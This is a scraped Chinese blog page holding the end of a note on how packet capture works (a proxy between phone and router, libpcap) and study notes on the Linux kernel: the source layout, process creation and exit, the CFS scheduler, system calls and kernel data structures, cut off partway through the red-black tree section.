<p><code>本地网络</code> 指的是WIFI的路由，如果直接抓路由器的包还是比较麻烦的，因此我们会在 <code>手机</code> 和 <code>本地路由</code> 之间加一层 <code>代理服务</code>，这样只要抓代理服务的网络数据即可：</p>
<img src="/2022/08/19/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86/1660838017257.png" class width="1660838017257"> 
<h2 id="Linux-抓包"><a href="#Linux-抓包" class="headerlink" title="Linux 抓包"></a>Linux 抓包</h2><p>Linux 抓包是通过 <strong>注册一种虚拟的底层网络协议</strong> 来完成对网络报文（准确的说是网络设备）消息的处理权</p>
<ul>
<li>当网卡接收到一个网络报文之后，它会遍历系统中所有已经注册的网络协议（例如，以太网协议，x25协议处理模块）来尝试进行报文的解析处理（这一点和一些文件系统的挂载相似，就是让系统中所有的已经注册的文件系统来进行尝试挂载，如果哪一个认为自己可以处理，那么就完成挂载）</li>
<li><p>当抓包模块把自己伪装成一个网络协议的时候，系统在收到报文的时候就会给这个伪协议一次机会，让它来对网卡收到的报文进行一次处理，此时该模块就会趁机对报文进行窥探，也就是把这个报文完完整整的复制一份，假装是自己接收到的报文，汇报给抓包模块 </p>
<p>具体是使用 libpcap 获取被监听网络接口的数据 </p>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">Linux内核学习笔记（持续更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-08-18 23:38:46" itemprop="dateCreated datePublished" datetime="2022-08-18T23:38:46+08:00">2022-08-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-08-30 17:54:38" itemprop="dateModified" datetime="2022-08-30T17:54:38+08:00">2022-08-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>40k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>36 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Linux-内核简述"><a href="#Linux-内核简述" class="headerlink" title="Linux 内核简述"></a>Linux 内核简述</h2><p>Linux 的内核虽然是基于单内核的，但是经过这么多年的发展，也具备微内核的一些特征（体现了 Linux 实用至上的原则）</p>
<p>主要有以下特征：</p>
<ul>
<li>支持动态加载内核模块</li>
<li>支持对称多处理（SMP）</li>
<li>内核可以抢占（preemptive），允许内核运行的任务有优先执行的能力</li>
<li>不区分线程和进程</li>
</ul>
<h2 id="Linux-内核源码的结构"><a href="#Linux-内核源码的结构" class="headerlink" title="Linux 内核源码的结构"></a>Linux 内核源码的结构</h2><div class="table-container">
<table>
<thead>
<tr>
<th><strong>目录</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>arch</td>
<td>特定体系结构的代码</td>
</tr>
<tr>
<td>block</td>
<td>块设备I/O层</td>
</tr>
<tr>
<td>crypo</td>
<td>加密API</td>
</tr>
<tr>
<td>Documentation</td>
<td>内核源码文档</td>
</tr>
<tr>
<td>drivers</td>
<td>设备驱动程序</td>
</tr>
<tr>
<td>firmware</td>
<td>使用某些驱动程序而需要的设备固件</td>
</tr>
<tr>
<td>fs</td>
<td>VFS和各种文件系统</td>
</tr>
<tr>
<td>include</td>
<td>内核头文件</td>
</tr>
<tr>
<td>init</td>
<td>内核引导和初始化</td>
</tr>
<tr>
<td>ipc</td>
<td>进程间通信代码</td>
</tr>
<tr>
<td>kernel</td>
<td>像调度程序这样的核心子系统</td>
</tr>
<tr>
<td>lib</td>
<td>同样内核函数</td>
</tr>
<tr>
<td>mm</td>
<td>内存管理子系统和VM</td>
</tr>
<tr>
<td>net</td>
<td>网络子系统</td>
</tr>
<tr>
<td>samples</td>
<td>示例，示范代码</td>
</tr>
<tr>
<td>scripts</td>
<td>编译内核所用的脚本</td>
</tr>
<tr>
<td>security</td>
<td>Linux 安全模块</td>
</tr>
<tr>
<td>sound</td>
<td>语音子系统</td>
</tr>
<tr>
<td>usr</td>
<td>早期用户空间代码（所谓的initramfs）</td>
</tr>
<tr>
<td>tools</td>
<td>在Linux开发中有用的工具</td>
</tr>
<tr>
<td>virt</td>
<td>虚拟化基础结构</td>
</tr>
</tbody>
</table>
</div>
<h2 id="进程和线程"><a href="#进程和线程" class="headerlink" title="进程和线程"></a>进程和线程</h2><p>进程和线程是程序运行时状态，是动态变化的，进程和线程的管理操作（比如，创建，销毁等）都是有内核来实现的</p>
<p>Windows：开启的一个程序就是一个线程，它只是一个容器，用于装载系统资源，它并不执行代码，它是系统资源分配的最小单元，而在进程中执行代码的是线程，是代码执行的最小单位</p>
<p>Linux：Linux 中的进程于 Windows 相比是很轻量级的，而且不严格区分进程和线程，Linux 的进程就是 Windows 中的线程，线程就是轻量级的进程</p>
<p><strong>Linux 进程的创建</strong></p>
<p>Linux 中创建进程与其他系统有个主要区别，Linux 中创建进程分2步：fork() 和 exec() </p>
<ul>
<li>fork：通过拷贝当前进程创建一个子进程</li>
<li>exec：读取可执行文件，将其载入到内存中运行</li>
</ul>
<p>创建的流程： </p>
<ul>
<li>fork() 的底层是 _do_fork()，在其中会调用 copy_process()</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = copy_process(clone_flags, stack_start, stack_size,</span><br><span class="line">		 child_tidptr, <span class="literal">NULL</span>, trace, tls, NUMA_NO_NODE); <span class="comment">/* task_struct *p */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>调用 dup_task_struct() 为新进程分配内核栈，task_struct 等，其中的内容与父进程相同</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = dup_task_struct(current, node); <span class="comment">/* task_struct *p */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>check 新进程（进程数目是否超出上限等）</li>
<li>清理新进程的信息（比如 PID 置0等），使之与父进程区别开</li>
<li>新进程状态置为 TASK_UNINTERRUPTIBLE</li>
<li>更新 task_struct 的 flags 成员</li>
<li>执行调度程序相关设置，将此任务分配给 CPU，然后调用 copy 系列函数复制所有进程信息</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">shm_init_task(p);</span><br><span class="line">retval = security_task_alloc(p, clone_flags);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_audit;</span><br><span class="line">retval = copy_semundo(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_security;</span><br><span class="line">retval = copy_files(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_semundo;</span><br><span class="line">retval = copy_fs(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_files;</span><br><span class="line">retval = copy_sighand(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_fs;</span><br><span class="line">retval = copy_signal(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_sighand;</span><br><span class="line">retval = copy_mm(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_signal;</span><br><span class="line">retval = copy_namespaces(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_mm;</span><br><span class="line">retval = copy_io(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_namespaces;</span><br><span class="line">retval = copy_thread_tls(clone_flags, stack_start, stack_size, p, tls);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_io;</span><br></pre></td></tr></table></figure>
<ul>
<li>调用 alloc_pid() 为新进程分配一个有效的PID（copy_process() 返回）</li>
<li>根据 clone() 的参数标志 clone_flags，拷贝或共享相应的信息</li>
<li>做一些扫尾工作并返回新进程指针</li>
</ul>
<p>用户态创建进程的 fork() 函数实际上最终是调用 clone() 系统调用，创建线程和进程的步骤一样，只是最终传给 clone() 的参数不同</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7ea1f3d</span> &lt;fork+<span class="number">77</span>&gt;    syscall  &lt;SYS_clone&gt;</span><br><span class="line">       fn: <span class="number">0x1200011</span></span><br><span class="line">       child_stack: <span class="number">0x0</span></span><br><span class="line">       flags: <span class="number">0x0</span></span><br><span class="line">       arg: <span class="number">0x7ffff7fb2810</span> ◂— <span class="number">0x0</span></span><br><span class="line">       vararg: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>在内核中创建的内核线程与普通的进程之间还有个主要区别在于：</p>
<ul>
<li>内核线程没有独立的地址空间，它们只能在内核空间运行</li>
<li>这与之前提到的 Linux 内核是个单内核有关</li>
</ul>
<p><strong>Linux 进程的终止</strong></p>
<p>和创建进程一样，终结一个进程同样有很多步骤：</p>
<p>子进程上的操作：（do_exit）</p>
<ul>
<li>设置 task_struct 中的标识成员设置为 PF_EXITING</li>
<li>调用 del_timer_sync() 删除内核定时器, 确保没有定时器在排队和运行</li>
<li>调用 exit_mm() 释放进程占用的 mm_struct</li>
<li>调用 sem__exit() ，使进程离开等待 IPC 信号的队列</li>
<li>调用 exit_files() 和 exit_fs()，释放进程占用的文件描述符和文件系统资源</li>
<li>把 task_struct 的 exit_code 设置为进程的返回值</li>
<li>调用 exit_notify() 向父进程发送信号，并把自己的状态设为 EXIT_ZOMBIE</li>
<li>切换到新进程继续执行</li>
</ul>
<p>子进程进入 EXIT_ZOMBIE 之后，虽然永远不会被调度，关联的资源也释放掉了，但是它本身占用的内存还没有释放（比如：创建时分配的内核栈，task_struct 结构等），这些由父进程来释放</p>
<p>父进程上的操作：（release_task）</p>
<ul>
<li>父进程受到子进程发送的 exit_notify() 信号后，将该子进程的进程描述符和所有进程独享的资源全部删除</li>
</ul>
<p>从上面的步骤可以看出，必须要确保每个子进程都有父进程，如果父进程在子进程结束之前就已经结束了会怎么样呢？</p>
<ul>
<li>子进程在调用 exit_notify() 时已经考虑到了这点</li>
<li>如果子进程的父进程已经退出了，那么子进程在退出时，exit_notify() 函数会先调用 forget_original_parent() ，然后再调用 find_new_reaper() 来寻找新的父进程</li>
<li>find_new_reaper() 函数先在当前线程组中找一个线程作为父亲，如果找不到，就让 init 做父进程（init 进程是在 linux 启动时就一直存在的）</li>
</ul>
<h2 id="进程的调度"><a href="#进程的调度" class="headerlink" title="进程的调度"></a>进程的调度</h2><p>现在的操作系统都是多任务的，为了能让更多的任务能同时在系统上更好的运行，需要一个管理程序来管理计算机上同时运行的各个任务（也就是进程）</p>
<p>这个管理程序就是调度程序，它的功能说起来很简单：</p>
<ul>
<li>决定哪些进程运行，哪些进程等待</li>
<li>决定每个进程运行多长时间</li>
</ul>
<p>此外，为了获得更好的用户体验，运行中的进程还可以立即被其他更紧急的进程打断</p>
<p>总之，调度是一个平衡的过程：</p>
<ul>
<li>一方面，它要保证各个运行的进程能够最大限度的使用CPU（即尽量少的切换进程，进程切换过多，CPU的时间会浪费在切换上）</li>
<li>另一方面，保证各个进程能公平的使用CPU（即防止一个进程长时间独占CPU的情况）</li>
</ul>
<p><strong>完全公平调度器 CFS</strong></p>
<p>前面说过，调度功能就是决定哪个进程运行以及进程运行多长时间</p>
<p>进程的优先级有2种度量方法，一种是 nice 值，一种是实时优先级：（实时优先级 &gt; nice 值）</p>
<ul>
<li>nice 值的范围是 -20～19，值越大优先级越低，也就是说 nice 值为 -20 的进程优先级最大</li>
<li>实时优先级的范围是 0～99，与 nice 值的定义相反，实时优先级是值越大优先级越高</li>
</ul>
<p>实时进程都是一些对响应时间要求比较高的进程，因此系统中有实时优先级高的进程处于运行队列的话，它们会抢占一般的进程的运行时间</p>
<p>介绍下 CFS：</p>
<ul>
<li>CFS 使用红黑树结构，来存储要调度的任务队列</li>
<li>每个节点代表了一个要调度的任务，节点的 key 即为虚拟时间（vruntime），虚拟时间由这个人物的运行时间计算而来</li>
<li>key 越小，也就是 vruntime 越小的话，红黑树对应的节点就越靠左</li>
<li>CFS scheduler 每次都挑选最左边的节点作为下一个要运行的任务，这个节点是“缓存的”，由一个特殊的指针指向，不需要进行 <code>O(logn)</code> 遍历来查找，也因此，CFS 搜索的时间是 <code>O(1)</code></li>
</ul>
<p>vruntime(key) 的计算公式：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vruntime += 实际运行时间(time process run) * <span class="number">1024</span> / 进程权重(load weight of <span class="keyword">this</span> process)</span><br></pre></td></tr></table></figure>
<ul>
<li>实际运行时间：该程序已经运行了多久 </li>
<li>进程权重：根据任务的 nice 值进行索引</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> prio_to_weight[<span class="number">40</span>] = &#123;</span><br><span class="line"> <span class="comment">/* -20 */</span>     <span class="number">88761</span>,     <span class="number">71755</span>,     <span class="number">56483</span>,     <span class="number">46273</span>,     <span class="number">36291</span>,</span><br><span class="line"> <span class="comment">/* -15 */</span>     <span class="number">29154</span>,     <span class="number">23254</span>,     <span class="number">18705</span>,     <span class="number">14949</span>,     <span class="number">11916</span>,</span><br><span class="line"> <span class="comment">/* -10 */</span>      <span class="number">9548</span>,      <span class="number">7620</span>,      <span class="number">6100</span>,      <span class="number">4904</span>,      <span class="number">3906</span>,</span><br><span class="line"> <span class="comment">/*  -5 */</span>      <span class="number">3121</span>,      <span class="number">2501</span>,      <span class="number">1991</span>,      <span class="number">1586</span>,      <span class="number">1277</span>,</span><br><span class="line"> <span class="comment">/*   0 */</span>      <span class="number">1024</span>,       <span class="number">820</span>,       <span class="number">655</span>,       <span class="number">526</span>,       <span class="number">423</span>,</span><br><span class="line"> <span class="comment">/*   5 */</span>       <span class="number">335</span>,       <span class="number">272</span>,       <span class="number">215</span>,       <span class="number">172</span>,       <span class="number">137</span>,</span><br><span class="line"> <span class="comment">/*  10 */</span>       <span class="number">110</span>,        <span class="number">87</span>,        <span class="number">70</span>,        <span class="number">56</span>,        <span class="number">45</span>,</span><br><span class="line"> <span class="comment">/*  15 */</span>        <span class="number">36</span>,        <span class="number">29</span>,        <span class="number">23</span>,        <span class="number">18</span>,        <span class="number">15</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>相当于 nice 和 weight 是等价的，但是不同 nice 值的任务权重差别变大了</li>
</ul>
<p>例子：现在我们有一个刚来的进程 [time=0，nice=0，priority=1024]：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vruntime += <span class="number">0</span> * <span class="number">1024</span> / <span class="number">1024</span> = <span class="number">10</span> <span class="comment">/* vruntime有一个最小值min_vruntime */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>vruntime 并不是无限小的，有一个最小值来限定 min_vruntime </li>
<li>假如新进程的 vruntime 初值为0的话，比老进程的值小很多，那么它在相当长的时间内都会保持抢占CPU的优势，老进程就要饿死了，这显然是不公平的</li>
</ul>
<p>CFS 是这样做的：每个CPU的运行队列 cfs_rq 都维护一个 min_vruntime 字段，记录该运行队列中所有进程的 vruntime 最小值，新进程的初始 vruntime 值就以它所在运行队列的 min_vruntime 为基础来设置，与老进程保持在合理的差距范围内</p>
<p>对于新任务来说，vruntime = 0（任务：用于完成某个操作的一组 [进程,线程]，用 <code>task_struct</code> 结构体来描述）</p>
<p><strong>关于时间片</strong></p>
<p>决定哪个进程运行以及运行多长时间都和进程的优先级有关，但是对于调度程序来说，并不是运行一次就结束了，还必须知道间隔多久进行下次调度</p>
<p>为了确定一个进程到底能持续运行多长时间，调度中还引入了时间片的概念，也可以认为是进程在下次调度发生前运行的时间（除非进程主动放弃CPU，或者有实时进程来抢占CPU）</p>
<p>时间片的大小设置并不简单：</p>
<ul>
<li>设大了，系统响应变慢（调度周期长）</li>
<li>设小了，进程频繁切换带来的处理器消耗</li>
<li>默认的时间片一般是10ms</li>
</ul>
<p><strong>调度策略</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>策略</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>SCHED_NORMAL</td>
<td>普通的分时进程，使用的 fair_sched_class 调度类</td>
</tr>
<tr>
<td>SCHED_FIFO</td>
<td>先进先出的实时进程，当调用程序把CPU分配给进程的时候，它把该进程描述符保留在运行队列链表的当前位置，此调度策略的进程一旦使用CPU则一直运行，如果没有其他可运行的更高优先级实时进程，进程就继续使用CPU，想用多久就用多久，即使还有其他具有相同优先级的实时进程处于可运行状态，使用的是 rt_sched_class 调度类</td>
</tr>
<tr>
<td>SCHED_RR</td>
<td>时间片轮转的实时进程，当调度程序把CPU分配给进程的时候，它把该进程的描述符放在运行队列链表的末尾，这种策略保证对所有具有相同优先级的 SCHED_RR 实时进程进行公平分配CPU时间，使用的 rt_sched_class 调度类</td>
</tr>
<tr>
<td>SCHED_BATCH</td>
<td>是 SCHED_NORMAL 的分化版本，采用分时策略，根据动态优先级，分配CPU资源，在有实时进程的时候，实时进程优先调度，但针对吞吐量优化，除了不能抢占外与常规进程一样，允许任务运行更长时间，更好使用高速缓存，适合于成批处理的工作，使用的 fair_shed_class 调度类</td>
</tr>
<tr>
<td>SCHED_IDLE</td>
<td>优先级最低，在系统空闲时运行，使用的是 idle_sched_class 调度类，给0号进程使用</td>
</tr>
<tr>
<td>SCHED_DEADLINE</td>
<td>新支持的实时进程调度策略，针对突发型计算，并且对延迟和完成时间敏感的任务使用，基于 EDF（earliest deadline first），使用的是 dl_sched_class 调度类</td>
</tr>
</tbody>
</table>
</div>
<h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>简单来说，系统调用就是用户程序和硬件设备之间的桥梁，用户程序在需要的时候，通过系统调用来使用硬件设备</p>
<p>系统调用的存在，有以下重要的意义：</p>
<ul>
<li>用户程序通过系统调用来使用硬件，而不用关心具体的硬件设备，这样大大简化了用户程序的开发 </li>
<li>系统调用使得用户程序有更好的可移植性</li>
<li>系统调用使得内核能更好的管理用户程序，增强了系统的稳定性 </li>
<li>系统调用有效的分离了用户程序和内核的开发</li>
</ul>
<p>用户程序，系统调用，内核，硬件设备的调用关系如下图： </p>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660827734080-1661853278301.png" class width="1660827734080"> 
<p>要想实现系统调用，主要实现以下几个方面：</p>
<ul>
<li>通知内核调用一个哪个系统调用（系统调用号）</li>
<li>用户程序把系统调用的参数传递给内核（前5个参数放在 [ebx,ecx,edx,esi,edi] 中，如果参数多的话，还需要用个单独的寄存器存放指向所有参数在用户空间地址的指针）</li>
<li>用户程序获取内核返回的系统调用返回值（获取系统调用的返回值也是通过寄存器，在x86系统上，返回值放在 [eax] 中）</li>
</ul>
<h2 id="内核数据结构"><a href="#内核数据结构" class="headerlink" title="内核数据结构"></a>内核数据结构</h2><p>Linux 中4个基本的内核数据结构：链表，队列，映射，红黑树</p>
<p><strong>链表</strong></p>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660832270823-1661853278302.png" class width="1660832270823"> 
<ul>
<li>有个单独的头结点（head）</li>
<li>每个节点（node）除了包含必要的数据之外，还有2个指针（pre,next）</li>
<li>pre 指针指向前一个节点（node），next 指针指向后一个节点（node）</li>
<li>头结点（head）的 pre 指针指向链表的最后一个节点</li>
<li>最后一个节点的next指针指向头结点（head）</li>
</ul>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660832773428-1661853278302.png" class width="1660832773428"> 
<ul>
<li>其实就是把数据放在前面了而已</li>
</ul>
<p><strong>队列</strong></p>
<p>内核中的队列是以字节形式保存数据的，所以获取数据的时候，需要知道数据的大小，如果从队列中取得数据时指定的大小不对的话，取得数据会不完整或过大</p>
<ul>
<li>队列是限制在两端进行插入操作和删除操作的线性表，允许进行存入操作的一端称为“队尾”，允许进行删除操作的一端称为“队头”</li>
<li>当线性表中没有元素时，称为“空队”</li>
<li>特点：先进先出（FIFO）</li>
</ul>
<p>顺序队列：</p>
<p>建立顺序队列结构必须为其静态分配或动态申请一片连续的存储空间，并设置两个指针进行管理：</p>
<ul>
<li>一个是队头指针 front，它指向队头元素</li>
<li>另一个是队尾指针 rear，它指向下一个入队元素的存储位置 </li>
</ul>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660834074319-1661853278302.png" class width="1660834074319"> 
<p>链式队列：</p>
<p>一个链队列显然需要两个分别指示队头和队尾的指针（分别成为头指针和尾指针）才能唯一确定：</p>
<ul>
<li>这里，和线性表的单链表一样，为了操作方便起见，我们也给队列添加一个头结点，并令头指针指向头节点</li>
<li>由此，空的链队列的判决条件为头指针和尾指针均指向头结点</li>
</ul>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660834323260-1661853278302.png" class width="1660834323260"> 
<p><strong>映射</strong></p>
<p>映射（也称为关联数组）是实现（key，value）绑定的一种数据结构（有点像其他语言中的字典类型），每个唯一的ID对应一个自定义的数据结构</p>
<p>在 Linux 中的使用案例就是：整数ID管理机制（IDR）</p>
<ul>
<li>IDR 是用于将 uid 和一个数据地址进行绑定的一种映射</li>
<li>IDR 把每一个ID分级数据进行管理，每一级维护着ID的5位数据，这样就可以把IDR分为7级进行管理</li>
<li>IDR 底层使用了 redix 树 </li>
</ul>
<p>IDR 怎么对于数据ID管理呢？传统上我们对于未使用的ID进行管理的时候可以使用位图进行管理，也可以使用数组进行管理，也可以使用链表进行ID管理，三个个各有优缺点：</p>
<ul>
<li>使用位图进行管理：使用空间少，但是对于位图对应的数据结构支持不太友好</li>
<li>使用数组进行管理：寻址快速，但是只能管理比较少量的ID数目</li>
<li>使用链表进行管理：可以支持大量的数据ID，但是通过链表的指针寻址比较慢</li>
</ul>
<p>而 IDR 管理可以集合以上3者的优点</p>
<p>IDR 中有两个数据结构：idr 和 idr_layer </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">idr</span> &#123;</span>                    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">idr_layer</span> __<span class="title">rcu</span>    *<span class="title">hint</span>;</span>      <span class="comment">/* 最近一个存储指针数据的的idr_layer结构  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">idr_layer</span> __<span class="title">rcu</span>    *<span class="title">top</span>;</span>       <span class="comment">/* idr的顶层(根节点) */</span></span><br><span class="line">    <span class="keyword">int</span>            layers;                <span class="comment">/* idr树中的idr_layer层数量 */</span></span><br><span class="line">    <span class="keyword">int</span>            cur;                   <span class="comment">/* current pos for cyclic allocation */</span></span><br><span class="line">    <span class="keyword">spinlock_t</span>        lock;                </span><br><span class="line">    <span class="keyword">int</span>            id_free_cnt;			<span class="comment">/* idr_layer空闲链表中剩余的idr_layer个数 */</span>            </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">idr_layer</span>    *<span class="title">id_free</span>;</span>		<span class="comment">/* 指向idr_layer的空闲链表 */</span>        </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>struct idr 类似于 list_head，用于管理 IDR 整个树的信息</li>
<li>其中最关键的是 top，它指向了根节点的 idr_layer</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">idr_layer</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span>			prefix;                        <span class="comment">/* the ID prefix of this idr_layer */</span></span><br><span class="line">	<span class="keyword">int</span>			layer;                        <span class="comment">/* 第几层 distance from leaf */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">idr_layer</span> __<span class="title">rcu</span>	*<span class="title">ary</span>[1&lt;</span>&lt;IDR_BITS]; <span class="comment">/* IDR_BITS = 8 该层有256个指针,指向256个idr_layer */</span></span><br><span class="line">	<span class="keyword">int</span>			count;                        <span class="comment">/* ary数组使用计数 */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		DECLARE_BITMAP(bitmap, IDR_SIZE);	  <span class="comment">/* 槽位图 */</span>		</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>		<span class="title">rcu_head</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>如图：</p>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660836387459-1661853278302.png" class width="1660836387459"> 
<p>参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1432802">linux内核IDR机制详解</a> </p>
<p><strong>红黑树</strong></p>
<p>红黑树是对概念模型2-3-4树的一种实现，由于直接进行不同节点间的转化会造成较大的开销，所以选择以二叉树为基础，在二叉树的属性中加入一个 <strong>颜色属性</strong> 来表示2-3-4树中不同的节点</p>
<p>红黑规则：</p>
<ul>
<li>节点不是黑色，就是红色（非黑即红）</li>
<li>根节点为黑色，叶节点为黑色（叶节点是指末梢的空节点 <code>Nil</code>或<code>Null</code>）</li>
<li>一个节点为红色，则其两个子节点必须是黑色的（根到叶子的所有路径，不可能存在两个连续的红色节点）</li>
<li>每个节点到叶子节点的所有路径，都包含相同数目的黑色节点（相同的黑色高度）</li>
</ul>
<p>在插链的过程中，可能会破坏这些规则，这就需要一些机制来恢复平衡：</p>
